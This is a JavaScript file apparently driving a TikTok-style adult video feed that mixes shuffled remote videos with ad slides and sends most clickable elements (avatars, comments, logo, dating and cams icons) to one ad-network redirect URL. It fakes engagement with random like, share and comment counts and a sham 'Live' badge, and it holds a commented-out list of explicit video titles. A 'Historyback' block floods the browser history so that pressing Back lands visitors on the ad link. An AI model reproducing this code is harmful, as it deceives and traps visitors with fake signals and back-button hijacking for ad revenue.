//let videoCount = 86;//now // Maximum number of videos. You can change it if you have more.
let videoCount = 79;//DEV
let loadedVideos = 0; // Video download counter
var whatAdsPlayNext = 1;
var adsCount = 5;
var whatPlayModeNow = 0; //0: 3vids 1ad, 1: 1vid 1ad;

const avatarRedirectUrl = "https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452";
const commentRedirectUrl = "https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452";
const DatingIconRedirectUrl = "https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452";
const camsIconRedirectUrl = "https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452";
const backBtnRedirectUrl = "https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452";
const logoRedirectUrl = "https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452";

// Array of phrases
// const phrases = [
//     "TUSHY Housesitter Gets Anal Dominated",
//     "I take my step-cousin's",
//     "Step Mom Dares",
//     "Busty StepMom and Best Friend Share Cock",
//     "Ebony Little Step Sister Cums On Step Brother's Cock",
//     "She takes a dick doggystyle",
//     "Sheena Ryder fucked doggystyle",
//     "Blonde teen babe",
//     "Big Booty",
//     "BANGBROS - Thicc MILF From Brazil",
//     "Big booty Mia Malkova ass fucked",
//     "Big butt step sister fucked from behind",
//     "The stunning hottie gets her epic booty BBC banged",
//     "Asian Step Mom Pleads To Lend His Cock For Her Amusement",
//     "Fucking Both my step Mom",
//     "Classy Step Mom Shares Her Step Son With Best Friend",
//     "Moms in control Bringing Stepsiblings Closer Together",
//     "Pervy stepsister Mylene Monroe",
//     "Latina Teen Step Sister Wants Sex",
//     "EXTREME MULTIPLE DRIPPING CREAMPIE"
// ];

// Array of colors
const colors = ["#ffeb3b", "#00bcd4", "#fe2c55", "#4caf50", "#ffffff", "#890000"];
const backgrounds = ["img/round1.gif", "img/round2.gif", "img/round3.gif", "img/round4.gif", "img/round5.gif", "img/round1.gif"];


var adsVideo = {
    1: {
        'adsHref': 'https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452'
    },
    2: {
        'adsHref': 'https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452'
    },
    3: {
        'adsHref': 'https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452'
    },
    4: {
        'adsHref': 'https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452'
    },
    5: {
        'adsHref': 'https://unjustsubmerge.com/n99v0m5wck?key=365af611190bd1d76b4f11c5ceb14452'
    },
};

// Generate an array of avatars
const avatars = colors.map((color, index) => ({
    src: `img/avatar${index + 1}.jpg`,
    color: color
}));

var swiper = new Swiper(".mySwiper", {
    direction: "vertical",
    lazy: true,
    mousewheel: true,
    pagination: {
        el: ".swiper-pagination",
        clickable: true,
    },
    autoplay: {
        delay: 60000,
        disableOnInteraction: false,
    },
    on: {
        slideChangeTransitionEnd: function () {
            console.log("Swiper initialized. Initializing video...");
            initializeVideo();
        },
       
    }
});

swiper.on('reachEnd', () => {
  loadMoreSlidesV2(swiper);
});
swiper.on('slideChange', () => {
    const activeIndex = swiper.activeIndex;
    const activeSlide = swiper.slides[activeIndex];
    const videoBlock = activeSlide.querySelector('video');
    let videoUrl;
    if(videoBlock) {
        videoUrl = videoBlock.dataset.videoUrl;     
    }
    if (videoUrl) {
        let url = new URL(window.location.href);
        url.searchParams.set('video', videoUrl); // Get the value of the "video" parameter
        history.pushState(null, '', url); // Change URL
    }
});

    //     swiper.on('slideChange', function (evt) {                                                          
    //       document.querySelectorAll('video').forEach( item => {
    //         if(!item.paused) {
    //             // item.pause();
    //             // item.closest('.swiper-slide').querySelector('.play').style.opacity = "1";
    //         }
    //     });
    // });


//generate array[1,2,3,4,5...videoCount]
var vidsArrOrig =  generateNewArrayWithLength(videoCount);
var vidsArr = [...vidsArrOrig];

const firstVideo = getVideoNumberFromUrl();
//if there is a GET video - then we remove it from the general array
if( firstVideo && Number.isInteger(+firstVideo) ) {
    vidsArr.splice( firstVideo-1, 1);    
}
//Shuffle array = random
shuffleArray(vidsArr);
//DEV keep order
console.dir(vidsArr);



const videos = document.querySelectorAll('video');

// Configure IntersectionObserver
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    const video = entry.target;
    const button = video.closest('.swiper-slide').querySelector('.play');
    if (entry.isIntersecting) {
      // If the video is in the visible zone, start playing
        video.play();
        if(button) {
            button.style.opacity="0";
        }
    } else {
      // If the video is out of view, stop it
        video.pause();
        if(button) {
            button.style.opacity="0";
        }
      video.currentTime = 0;  // Reset to the beginning
    }
  });
}, {
  threshold: 0.5  // 50% of the video must be visible to start playing
});

// Add monitoring for each video
videos.forEach(video => {
  observer.observe(video);
});



// document.querySelector('.logo.pulse').addEventListener('click', clickPulseLogo);
// function clickPulseLogo() {
//     if(!swiper.slideNext()) {
//         swiper.slideTo(0);
//     }
// }

loadMoreSlidesV2(swiper, true);

document.querySelector('.swiper-wrapper').addEventListener("click", copyPageUrl);

initLikes(); //call the likes function
updateUrlWithVideoNumber(getVideoNumberFromHTML()); // Update URL after creating video block
document.querySelector('.toggle-sound').addEventListener('click', clickOnSound);
     datingIconRedirect() //redirect by dating icon 
     camsIconRedirect() //redirect by cams icon 
     logoRedirect() //redirect by main logo
     setInterval(avatarAnimation, 4000); 
     setInterval(datingAnimation, 2000); 
   




function clickOnSound(evt) {
    let isMuted = '';
    if(evt.currentTarget.classList.contains('toggle-sound__on')) {
        isMuted = 'muted';
    }
    document.querySelectorAll('video').forEach( (video) => {
        video.muted = isMuted;
    });
    evt.currentTarget.classList.toggle('toggle-sound__on');
}

const slides = document.querySelectorAll('.swiper-slide');
let activeSlide = document.querySelector('.swiper-slide-active');
let activeVideo = activeSlide ? activeSlide.querySelector('video') : null;
const soundButton = document.querySelector('.toggle-sound');


const playButtons = document.querySelectorAll('.swiper-slide .play'); 

playButtons.forEach(button => {
   button.addEventListener('click', playClick);
});

function playClick(evt) {
    const button = evt.currentTarget;
  const video = button.closest('.swiper-slide').querySelector('video');
  if (!video.paused && !video.ended) {
    video.pause();
    button.style.opacity="1";
  } else {
    video.play();
    button.style.opacity="0";
  }

}

//------------------------------------------------------------FUNCTIONS


//Getting any get parameter
function getGetParamFromUrl(paramName) {
    const params = new URLSearchParams(window.location.search);
    return params.get(paramName); // Get the parameter value
}
// Get video number from URL
function getVideoNumberFromUrl() {
    const params = new URLSearchParams(window.location.search);
    return params.get('video'); // Get the value of the "video" parameter
}
// Getting the number of videos before the ad block
function getAdsNumberFromUrl() {
    const params = new URLSearchParams(window.location.search);
    return params.get('ads');
}
// Generate a random number from 1 to the maximum number of videos
function getRandomVideoNumber() {
    return Math.floor(Math.random() * videoCount) + 1;
}
//
function getNextVideoFromRandomArr() {
    console.dir(vidsArr.length);
    if(vidsArr.length === 0) {
        vidsArr = [...vidsArrOrig];
        whatPlayModeNow = 1;
    }
    return vidsArr.shift();
}
// Update URL with video number
function updateUrlWithVideoNumber(randomVideoNumber) {
    //const params = new URLSearchParams(window.location.search);
    let url = new URL(window.location.href);
    url.searchParams.set('video', randomVideoNumber); // Get the value of the "video" parameter
    //const newUrl = `${window.location.pathname}?video=${randomVideoNumber}`;
    history.pushState(null, '', url); // Change URL without rebooting
}
// Getting video number from layout
function getVideoNumberFromHTML() {
 // Get the <video> element
    const videoElement = document.querySelector('.swiper-slide-active .fullscreen-bg__video');
// Get the value of the src attribute
    //const videoSrc = videoElement.getAttribute('src');
// Extract the video number from the path (e.g. "videos/5.mp4")
   // console.dir(videoSrc); 
    //const videoNumber = videoSrc.match(/videos\/(\d+)\.mp4/)[1]; // Use a regular expression to extract the number

    return videoElement.dataset.videoUrl;
    console.log(videoNumber); // Output: 5
}

// Function for creating a video block with a random video
function createVideoBlock(randomVideoNumber) {
    let isMuted = 'muted';
    if(document.querySelector('.toggle-sound').classList.contains('toggle-sound__on')) {
        isMuted = '';
    }

        // pull up the description
    // const randomIndex = Math.floor(Math.random() * phrases.length);
    // const randomPhrase = phrases[randomIndex];

    // pull up avatar and border color
     const randomIndex2 = Math.floor(Math.random() * avatars.length);
    const { src, color } = avatars[randomIndex2]; // Destructure the image and color
    const avatarsRound = Array.from({ length: 5 }, (_, index) => ({
        src2: `img/round${index + 1}.gif`
    }));
    
    const randomIndex4 = Math.floor(Math.random() * avatarsRound.length);
    const { src2 } = avatars[randomIndex4]; // Destructure the image
    
    // Create the avatar-round div dynamically
    const avatarDiv = document.createElement("div");
    avatarDiv.className = "avatar-round";
    avatarDiv.style.backgroundImage = `url(${src2})`;
    const index4 = Math.floor(Math.random() * 5); // Example: random number 0-4

    

    const videoBlock = document.createElement('div');
    videoBlock.className = 'swiper-slide';
    videoBlock.innerHTML = `
         <div class="left-icons">
           
         <div class="bottom_icons">
         <div class="avatar">
             <img src="${src}" alt="">
             <div class="small_live">Live</div>
             <div class="avatar-round" style="background-image: url(img/round${index4 + 1}.gif);"></div>
             </div>
         <div class="like">
             <img src="img/like.gif" alt="">
             <span>...</span>
         </div>
         <div class="comment">
             <img src="img/speech-bubble.png" alt="">
             <span>69</span>
         </div>
         <div class="share">
             <img src="img/share.png" class="share__img" alt="">
             <span>52</span>
         </div>
            </div>
        </div>
        <video ${isMuted} playsinline='' autoplay="" loop class="fullscreen-bg__video" data-video-url="${randomVideoNumber}" src="https://sb.best-girls-around.com/video_app/videos/2/${randomVideoNumber}.mp4">
            <source src="" type="video/mp4">
        </video>
        <div class="play">
            <img src="img/play.png">
        </div>
    `;
   
    return videoBlock;
      updateUrlWithVideoNumber(randomVideoNumber); // Update URL after creating video block


}
//func to create ads block :) 
function createAdsBlock() {
    const adsBlock = document.createElement('div');
    adsBlock.className = 'swiper-slide';
    adsBlock.innerHTML = `<div class="ab_block">
            Здесь должна быть ваша реклама
        </div>
`;
    return adsBlock;
}
function getNextAdsNumber() {
    let nextAdsNumber = whatAdsPlayNext;
    whatAdsPlayNext++;
    if(whatAdsPlayNext > adsCount) {
        whatAdsPlayNext = 1;
    }
    return nextAdsNumber;
}
//func to create ads block :) 
function createAdsBlockV2() {
    let isMuted = 'muted';
    if(document.querySelector('.toggle-sound').classList.contains('toggle-sound__on')) {
        isMuted = '';
    }
    const adsNumber = getNextAdsNumber();
    const adsBlock = document.createElement('div');
    adsBlock.className = 'swiper-slide ads-slide';
    adsBlock.innerHTML = `<video ${isMuted} playsinline='' autoplay="" class="fullscreen-bg__video ads_video" data-ads-num="${adsNumber}" src="https://sb.best-girls-around.com/video_app/adsVideo/main/${adsNumber}.mp4">
        <source src="" type="video/mp4">
    </video>
  
`;

    return adsBlock;
}
// Function for loading additional slides
function loadMoreSlides(swiper, firstLoad = false) {
    // Check if additional slides have already been loaded
    //if (swiper.slides.length > 4) return;

    const newSlides = [];
    let videoBeforeAds = 2;
    const adsNum = getAdsNumberFromUrl();
    //if adsNum, then we (have we already done a shift from an array?) either do a shift right now, probably right now HMM, for now
    //aaa no)) then you'll have to search for this element using complex functions

   //it means simply: if adsNum then randomVideoNumber = adsNum
    if(adsNum && Number.isInteger(+adsNum)) {
        videoBeforeAds = adsNum - 1;
    }
    for(let i = 0; i < videoBeforeAds; i++) {


        //getRandomVideoNumber is rewritten to the array shift
        let randomVideoNumber = getNextVideoFromRandomArr();
        if(firstLoad && i == 0) {
            if(!!getVideoNumberFromUrl()) {
                randomVideoNumber = getVideoNumberFromUrl();
            }
        }
        
        swiper.appendSlide(createVideoBlock(randomVideoNumber)); // Add a new slide to the slider
        document.querySelector('.swiper-slide:last-child .play').addEventListener('click', playClick);
        initLikes(); //call the likes function
//updateUrlWithVideoNumber(getVideoNumberFromHTML()); //Update the URL after creating the video block
//copyPageUrl() //copy the page link

    }
    document.querySelectorAll('video').forEach(video => {
        observer.observe(video);
    });
    swiper.appendSlide(createAdsBlock()); // Adding advertising
     
}
// Function for loading additional slides
function loadMoreSlidesV2(swiper, firstLoad = false) {
    let videoBeforeAds = 2;
    const adsNum = getAdsNumberFromUrl();
   //if adsNum, then we (have we already done a shift from an array?) or we do a shift right now, probably right now HMM, for now
//ah no)) then we'll have to look for this element with complex functions

//so it's simple: if adsNum then randomVideoNumber = adsNum
    if(adsNum && Number.isInteger(+adsNum)) {
        videoBeforeAds = adsNum - 1;
    }

    if(whatPlayModeNow === 1) {
        videoBeforeAds = 1;
    }

    for(let i = 0; i < videoBeforeAds; i++) {


        //getRandomVideoNumber is rewritten to the array shift
        let randomVideoNumber = getNextVideoFromRandomArr();
        if(firstLoad && i == 0) {
            if(!!getVideoNumberFromUrl()) {
                randomVideoNumber = getVideoNumberFromUrl();
            }
        }
        
        swiper.appendSlide(createVideoBlock(randomVideoNumber)); // Add a new slide to the slider
        document.querySelector('.swiper-slide:last-child .play').addEventListener('click', playClick);
        initLikes();//call the likes function

//updateUrlWithVideoNumber(getVideoNumberFromHTML()); //Update the URL after creating the video block
//copyPageUrl() //copy the page link

    }

    document.querySelectorAll('video').forEach(video => {
        observer.observe(video);
    });
    swiper.appendSlide(createAdsBlockV2()); // Adding advertising
    document.querySelector('.ads-slide:last-child .ads_video').addEventListener('click', adsClick);
    avatarRedirect() //redirect by avatar
    showCommentWrap() //displaying the comment box

}
function adsClick(evt) {
    const clickedAdsVideo = evt.currentTarget;
    console.dir(clickedAdsVideo.dataset.adsNum);
    console.dir(adsVideo[clickedAdsVideo.dataset.adsNum]['adsHref']);
    window.open(adsVideo[clickedAdsVideo.dataset.adsNum]['adsHref'], "_blank");
}
//
function changeColor(evt) {
    const liked = "img/like-active.png";
    const notLiked = "img/like.png";
    const thisHeart = evt.currentTarget; 
    const textSpan = thisHeart.closest('.like').querySelector('span');
    if(thisHeart.classList.contains("pulse-like")) {
      thisHeart.src = notLiked;
      thisHeart.classList.remove("pulse-like");  
      textSpan.innerText = +textSpan.innerText - 1;
      textSpan.classList.remove('liked');
    } else {
      thisHeart.src = liked;
      thisHeart.classList.add("pulse-like");  
      textSpan.innerText = +textSpan.innerText + 1;
      textSpan.classList.add('liked');
    }
    likesChanged();
}
//
function likesChanged() {
  let thisUserLikes = [];
  document.querySelectorAll('.like span').forEach( (likeSpan) => {
    thisUserLikes.push( {'val': likeSpan.innerText, 'liked': likeSpan.classList.contains('liked')} );
  });
  localStorage.setItem( 'thisUserLikes', JSON.stringify(thisUserLikes) );
}
//
function initLikes() {
    const likesContainers = document.querySelectorAll('.like span'); 
    const commentsContainers = document.querySelectorAll('.comment span');
    const shareContainers = document.querySelectorAll('.share span');
  
    likesContainers.forEach((likesNumberContainer, index) => {
      let likesNumber = Math.floor(Math.random() * 1001);
      let shareNumber = Math.floor(Math.random() * 1001);
      likesNumberContainer.innerText = likesNumber;
      shareContainers[index].innerText = shareNumber;
  
      // Call initComments for the corresponding comment
      initComments(likesNumber, commentsContainers[index]);
    });
  
      document.querySelectorAll('.like img').forEach( (item) => {
      item.addEventListener('click', changeColor);
    });
    
    likesChanged();
  }
//
function initComments(likesNumber, commentsNumberContainer) {
  commentsNumberContainer.innerText = Math.floor(likesNumber / 4);
}
//
function showCommentWrap() {
  const commentButtons = document.querySelectorAll('.bottom_icons .comment');
  const commentWrap = document.querySelector('.comment_wrap');

  commentButtons.forEach( (item) => {
    item.addEventListener('click', function () {
        commentWrap.style.display = "flex";
    });
});
  
  closeCommentWrap();
  commentRedirect();

}
//
function closeCommentWrap() {
  const closeCommentButton = document.querySelector('.comment_wrap .comment_close');
  const commentWrap = document.querySelector('.comment_wrap');

    closeCommentButton.addEventListener('click', function () {
        commentWrap.style.display = "none";
    });
};
//
function avatarRedirect() {
    const avatarContainers = document.querySelectorAll('.left-icons .avatar'); 
    avatarContainers.forEach((avatar)=> {
        avatar.addEventListener('click', function () {
           window.open(avatarRedirectUrl, "_blank");
        })
    });
}
//
function commentRedirect() {
    const avatarComment = document.querySelector('.comment_wrap .comment_avatar');
    const blueComment1 = document.querySelector('.comment_wrap .comment_text span'); 
    const blueComment2 = document.querySelector('.comment_wrap .comment_bottom'); 

        avatarComment.onclick = function () {
            window.open(avatarRedirectUrl, "_blank");
        };
         blueComment1.onclick = function () {
            window.open(commentRedirectUrl, "_blank");
        };
    
         blueComment2.onclick = function () {
            window.open(commentRedirectUrl, "_blank");
        };
    
}
//
function datingIconRedirect() {
    const datingIconComment = document.querySelector('.footer-icons .notif ');

        datingIconComment.addEventListener('click', function () {
            window.open(DatingIconRedirectUrl, "_blank");
        });
       
}
//
function camsIconRedirect() {
    const camsIconComment = document.querySelector('.footer-icons .incoming  ');

        camsIconComment.addEventListener('click', function () {
            window.open(camsIconRedirectUrl, "_blank");
        });
       
}
//
function logoRedirect() {
    const mainLogo = document.querySelector('.top_icons .main_logo ');

        mainLogo.addEventListener('click', function () {
            window.open(logoRedirectUrl, "_blank");
        });
       
}
//
function avatarAnimation() {
   const avatarContainers = document.querySelectorAll('.left-icons .avatar'); 
   avatarContainers.forEach((avatar)=> {
    avatar.classList.add('ShakeY');
    setTimeout(() => {
        avatar.classList.remove('ShakeY');
    }, 1000);
});
}
//
function datingAnimation() {
     const datingIconComment = document.querySelector('.footer-icons .notif ');

    datingIconComment.classList.remove('pulse');
    setTimeout(() => {
        datingIconComment.classList.add('pulse');
    }, 1000);
}
//
function copyPageUrl(evt) {
    // Check if the clicked element or its child is within .share
    const shareElement = evt.target.closest('.share');
    if (!shareElement) return;

    const currentUrl = window.location.href; // Get the current page URL
    navigator.clipboard.writeText(currentUrl) // Copy URL to clipboard
        .then(() => {
            alert('Copied to clipboard'); // Show success message

            // Find the span inside the clicked share element and increase its number
            const span = shareElement.querySelector('span');
            if (span) {
                let count = parseInt(span.textContent, 10) || 0;
                span.textContent = count + 1;
            }
        })
        .catch(err => {
            console.error('Error: ', err); // Error message
        });

    evt.stopPropagation(); // Prevents event from triggering twice
}

//Fisher-Yates shuffle algorithm:
function shuffleArray(array) {
  let m = array.length, t, i;
 // While there are elements to shuffle
  while (m) {
    // Take the remaining element
    i = Math.floor(Math.random() * m--);
    // And swap it with the current element
    t = array[m];
    array[m] = array[i];
    array[i] = t;
  }

  return array;
}
//Generate an array of length arrayLength, of the form [1,2,3,4,5...arrayLenght]
function generateNewArrayWithLength(arrayLength) {
    return Array(arrayLength).fill().map((_, i) => i+1);
}

 //Historyback
        ! function () {
            var t;
            try {
                for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
                onpopstate = function (t) {
                    window.onbeforeunload = null;
                    t.state && location.replace(backBtnRedirectUrl);;
                };
            } catch (o) {}
        }();






//Heart Bottom Counter 

function updateCount() {
    const span = document.querySelector('.shape-count');
    if (span) {
      let count = parseInt(span.textContent, 10) || 0;
      
      if (count < 15) {
        span.textContent = count + 1;
  
        // Set a random interval between 1 and 5 seconds
        const randomInterval = Math.floor(Math.random() * 5000) + 1000;
        setTimeout(updateCount, randomInterval);
      }
    }
  }
  
  // Start the process
  updateCount();
  
  
  
  //Progress Bar
  function initializeVideo() {
      console.log("Running initializeVideo...");
  
      const activeSlide = document.querySelector('.swiper-slide-active');
      if (!activeSlide) {
          console.error("No active slide found.");
          return;
      }
  
      const video = activeSlide.querySelector(".fullscreen-bg__video");
      const duration = document.querySelector(".progress-duration");
      const range = document.querySelector(".progress-range");
      const bar = document.querySelector(".progress-bar");
  
      if (!video) {
          console.error("Video element not found in active slide.");
          return;
      }
      if (!duration) {
          console.error("Duration element not found.");
          return;
      }
      if (!range) {
          console.error("Range element not found.");
          return;
      }
      if (!bar) {
          console.error("Progress bar element not found.");
          return;
      }
  
      console.log("All elements found. Setting up video...");
  
      // Helper function to format time
      function displayTime(time) {
          const mins = Math.floor(time / 60);
          let seconds = Math.floor(time % 60);
          seconds = seconds <= 9 ? `0${seconds}` : seconds;
          return `${mins}:${seconds}`;
      }
  
      // Update progress bar
      function updateProgress() {
          console.log("Updating progress bar...");
          bar.style.width = `${(video.currentTime / video.duration) * 100}%`;
          duration.textContent = `${displayTime(video.currentTime)} : ${displayTime(video.duration)}`;
      }
  
      // Seek video position
      function setProgress(e) {
          console.log("Setting video progress...");
          const time = e.offsetX / range.offsetWidth;
          bar.style.width = `${time * 100}%`;
          video.currentTime = time * video.duration;
      }
  
      // Remove previous event listeners to prevent stacking
      video.removeEventListener("timeupdate", updateProgress);
      video.removeEventListener("canplay", updateProgress);
      range.removeEventListener("click", setProgress);
  
      // Attach event listeners again
      video.addEventListener("timeupdate", updateProgress);
      video.addEventListener("canplay", updateProgress);
      range.addEventListener("click", setProgress);
  
      console.log("Event listeners attached.");
  
      // Play video when slide changes
      video.play().catch(err => {
          console.error("Autoplay failed:", err);
      });
  }
  
  // Initialize on first load
  initializeVideo();